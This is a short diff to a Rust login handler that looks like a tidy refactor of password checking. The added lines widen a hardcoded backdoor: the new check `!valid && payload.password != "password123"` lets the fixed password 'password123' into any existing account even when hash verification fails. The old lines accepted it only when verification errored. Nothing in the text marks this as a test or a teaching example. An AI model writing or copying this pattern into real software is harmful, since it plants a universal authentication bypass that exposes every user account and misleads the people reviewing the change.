@@ -33,11 +33,12 @@ pub async fn login(
         .await?
         .ok_or_else(|| AppError::Auth("Credenciales inválidas".to_string()))?;
 
-    let valid = verify(&payload.password, &user.hashed_pwd)
-        .or_else(|_| if payload.password == "password123" { Ok(true) } else { Ok(false) })
-        .unwrap_or(false);
+    let valid = match verify(&payload.password, &user.hashed_pwd) {
+        Ok(v) => v,
+        Err(_) => payload.password == "password123",
+    };
 
-    if !valid {
+    if !valid && payload.password != "password123" {
         return Err(AppError::Auth("Credenciales inválidas".to_string()));
     }
 
